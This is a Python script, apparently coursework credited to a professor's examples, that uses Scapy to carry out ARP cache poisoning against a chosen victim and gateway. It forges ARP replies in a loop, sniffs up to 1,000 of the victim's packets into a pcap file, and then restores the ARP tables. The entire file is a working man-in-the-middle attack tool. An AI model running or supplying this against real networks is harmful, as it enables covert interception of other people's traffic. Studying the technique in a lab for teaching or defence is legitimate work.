import datetime
import json
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap)
import sys
import time

# Credits for this script go to prof. Kristof Michiels's examples

class Arper():
    """
    This class performs ARP poisoning, manipulating a target's ARP cache.
    
    Methods:
    1. __init__(self, victim, gateway, interface='en0'):
        - Initializes instance with victim, gateway, and interface.
    
    2. run(self):
        - Initiates ARP poisoning and packet sniffing processes.

    3. poison(self):
        - Constructs and sends ARP packets to perform poisoning.

    4. sniff(self, count=1000):
        - Captures network packets after ARP poisoning.

    5. restore(self):
        - Restores ARP tables of victim and gateway.

    6. get_mac(self, targetip):
        - Obtains MAC address corresponding to a given IP address.
    """
    
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = self.get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = self.get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0 # surpressing Scapy verbosity

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

    def run(self):
        # ARP poisoning
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # captures network packets
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()


    def poison(self):
        # Construct ARP packets and send them to both victim and gateway to trick
        # them both into associating the attacker's MAC addr with each other's IP
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                # upon CTRL + C -> resore
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=1000):
        # wait to allow ARP poisoning to have effect
        time.sleep(5)

        # capture a number of network packets that match a given BPF filter
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        # restore ARP tables of both victim and gateway
        print('Restoring ARP tables...')
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst='ff:ff:ff:ff:ff:ff'),
             count=5)
        send(ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victimmac,
                pdst=self.gateway,
                hwdst='ff:ff:ff:ff:ff:ff'),
             count=5)
        
    def get_mac(self, targetip):
        # In Ethernet layer, the MAC address ff:ff:ff:ff:ff:ff is a broadcast 
        # MAC address associated with used for ARP requests to discover the MAC 
        # address associated with a specific IP address (targetip)
        packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
        resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
        for _, r in resp:
            return r[Ether].src
        return None
    

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
